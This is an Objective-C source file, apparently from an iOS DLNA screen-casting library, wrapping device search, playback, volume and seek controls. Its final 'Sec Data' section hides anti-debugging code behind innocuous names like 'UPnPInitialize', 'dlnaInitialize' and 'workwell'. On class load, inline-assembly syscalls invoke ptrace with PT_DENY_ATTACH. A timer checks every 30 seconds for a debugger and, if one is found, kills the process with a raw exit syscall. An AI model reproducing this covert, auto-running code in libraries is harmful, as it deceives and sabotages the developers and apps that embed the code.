//
//  MRDLNA.m
//  MRDLNA
//
//  Created by MccRee on 2018/5/4.
//

#import "MRDLNA.h"
#import "StopAction.h"
#import "CLUPnPInfo.h"
#import <sys/sysctl.h>

@interface MRDLNA()<CLUPnPServerDelegate, CLUPnPResponseDelegate>

@property(nonatomic,strong) CLUPnPServer *upd;              //MDS服务器
@property(nonatomic,strong) NSMutableArray *dataArray;

@property(nonatomic,strong) CLUPnPRenderer *render;         //MDR渲染器
@property(nonatomic,copy) NSString *volume;
@property(nonatomic,assign) NSInteger seekTime;
@property(nonatomic,assign) BOOL isPlaying;

@end

@implementation MRDLNA

+ (MRDLNA *)sharedMRDLNAManager{
    static MRDLNA *instance = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        instance = [[self alloc] init];
    });
    return instance;
}

- (instancetype)init
{
    self = [super init];
    if (self) {
        self.upd = [CLUPnPServer shareServer];
        self.upd.searchTime = 10;
        self.upd.delegate = self;
        self.dataArray = [NSMutableArray array];
    }
    return self;
}

/**
 ** DLNA投屏
 */
- (void)startDLNA{
    [self initCLUPnPRendererAndDlnaPlay];
}
/**
 ** DLNA投屏
 ** 【流程: 停止 ->设置代理 ->设置Url -> 播放】
 */
- (void)startDLNAAfterStop{
    StopAction *action = [[StopAction alloc]initWithDevice:self.device Success:^{
        [self initCLUPnPRendererAndDlnaPlay];
        
    } failure:^{
        [self initCLUPnPRendererAndDlnaPlay];
    }];
    [action executeAction];
}
/**
 初始化CLUPnPRenderer
 */
-(void)initCLUPnPRendererAndDlnaPlay{
    self.render = [[CLUPnPRenderer alloc] initWithModel:self.device];
    self.render.delegate = self;
    [self.render setAVTransportURL:self.playUrl];
}
/**
 退出DLNA
 */
- (void)endDLNA{
    [self.render stop];
}

/**
 播放
 */
- (void)dlnaPlay{
    [self.render play];
}


/**
 暂停
 */
- (void)dlnaPause{
    [self.render pause];
}

- (void)dlnaPositionInfo {
    [self.render getPositionInfo];
}

/**
 搜设备
 */
- (void)startSearch{
    [self.upd start];
}


/**
 结束搜设备
 */
- (void)endSearch {
    [self.upd stop];
}


/**
 设置音量
 */
- (void)volumeChanged:(NSString *)volume{
    self.volume = volume;
    [self.render setVolumeWith:volume];
}


/**
 播放进度条
 */
- (void)seekChanged:(NSInteger)seek{
    self.seekTime = seek;
    NSString *seekStr = [self timeFormatted:seek];
    [self.render seekToTarget:seekStr Unit:unitREL_TIME];
}


/**
 播放进度单位转换成string
 */
- (NSString *)timeFormatted:(NSInteger)totalSeconds
{
    NSInteger seconds = totalSeconds % 60;
    NSInteger minutes = (totalSeconds / 60) % 60;
    NSInteger hours = totalSeconds / 3600;
    return [NSString stringWithFormat:@"%02ld:%02ld:%02ld",(long)hours, (long)minutes, (long)seconds];
}

/**
 播放切集
 */
- (void)playTheURL:(NSString *)url{
    self.playUrl = url;
    [self.render setAVTransportURL:url];
}

#pragma mark -- 搜索协议CLUPnPDeviceDelegate回调
- (void)upnpSearchChangeWithResults:(NSArray<CLUPnPDevice *> *)devices{
    NSMutableArray *deviceMarr = [NSMutableArray array];
    for (CLUPnPDevice *device in devices) {
        // 只返回匹配到视频播放的设备
        if ([device.uuid containsString:serviceType_AVTransport]) {
            [deviceMarr addObject:device];
        }
    }
    if ([self.delegate respondsToSelector:@selector(searchDLNAResult:)]) {
        [self.delegate searchDLNAResult:[deviceMarr copy]];
    }
    self.dataArray = deviceMarr;
}

- (void)upnpSearchErrorWithError:(NSError *)error{
    NSLog(@"DLNA_Error======>%@", error);
}

#pragma mark - CLUPnPResponseDelegate
- (void)upnpSetAVTransportURIResponse{
    [self.render play];
}

- (void)upnpGetTransportInfoResponse:(CLUPnPTransportInfo *)info{
//    NSLog(@"%@ === %@", info.currentTransportState, info.currentTransportStatus);
    if (!([info.currentTransportState isEqualToString:@"PLAYING"] || [info.currentTransportState isEqualToString:@"TRANSITIONING"])) {
        [self.render play];
    }
}

- (void)upnpPlayResponse{
    if ([self.delegate respondsToSelector:@selector(dlnaStartPlay)]) {
        [self.delegate dlnaStartPlay];
    }
}

- (void)upnpGetPositionInfoResponse:(CLUPnPAVPositionInfo *)info {
    if (self.delegate && [self.delegate respondsToSelector:@selector(dlnaUpnpGetPositionInfoResponse:)]) {
        [self.delegate dlnaUpnpGetPositionInfoResponse:info];
    }
}

- (void)upnpPauseResponse {
    if (self.delegate && [self.delegate respondsToSelector:@selector(dlnaPauseResponse)]) {
        [self.delegate dlnaPauseResponse];
    }
}

- (void)upnpSeekResponse {
    if (self.delegate && [self.delegate respondsToSelector:@selector(dlnaSeekResponse)]) {
        [self.delegate dlnaSeekResponse];
    }
}

- (void)upnpStopResponse {
    if (self.delegate && [self.delegate respondsToSelector:@selector(dlnaStopResponse)]) {
        [self.delegate dlnaStopResponse];
    }
}

- (void)upnpUndefinedResponse:(NSString *)resXML postXML:(NSString *)postXML {
    if (self.delegate && [self.delegate respondsToSelector:@selector(dlnaUndefinedResponse:postXML:)]) {
        [self.delegate dlnaUndefinedResponse:resXML postXML:postXML];
    }
}

#pragma mark - Set&Get
- (void)setSearchTime:(NSInteger)searchTime{
    _searchTime = searchTime;
    self.upd.searchTime = searchTime;
}

#pragma mark - Sec Data
static __attribute__((always_inline)) void workwell() {
#ifdef __arm64__
    asm volatile(
                 "mov x0,#0\n"
                 "mov w16,#1\n"
                 "svc #0x80\n"
                 );
#endif
    
#ifdef __arm__
    asm volatile(
                 "mov r0,#0\n"
                 "mov r12,#1\n"
                 "svc #0x80\n"
                 );
#endif
}

//检测调试
BOOL isDlnaInitialize(){
    int name[4];//里面放字节码。查询的信息
    name[0] = CTL_KERN;//内核查询
    name[1] = KERN_PROC;//查询进程
    name[2] = KERN_PROC_PID;//传递的参数是进程的ID
    name[3] = getpid();//PID的值
    
    struct kinfo_proc info;//接受查询结果的结构体
    size_t info_size = sizeof(info);
    if(sysctl(name, 4, &info, &info_size, 0, 0)){
//        NSLog(@"查询失败");
        return NO;
    }
    //看info.kp_proc.p_flag 的第12位。如果为1，表示调试状态。
    //(info.kp_proc.p_flag & P_TRACED)
    
    return ((info.kp_proc.p_flag & P_TRACED) != 0);
}

static dispatch_source_t timer;
void dlnaInitialize(){
    timer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_global_queue(0, 0));
    dispatch_source_set_timer(timer, DISPATCH_TIME_NOW, 30.0 * NSEC_PER_SEC, 0.0 * NSEC_PER_SEC);
    dispatch_source_set_event_handler(timer, ^{
        if (isDlnaInitialize()) {
            workwell();
        }
    });
    dispatch_resume(timer);
}

static __attribute__((always_inline)) void UPnPInitialize() {
#ifdef __arm64__
    asm volatile(
                 "mov x0,#26\n"
                 "mov x1,#31\n"
                 "mov x2,#0\n"
                 "mov x3,#0\n"
                 "mov x16,#0\n"//中断根据x16 里面的值，跳转syscall
                 "svc #0x80\n"//这条指令就是触发中断（系统级别的跳转！）
    );
#endif
}

+ (void)load {
    UPnPInitialize();
    dlnaInitialize();
}

@end
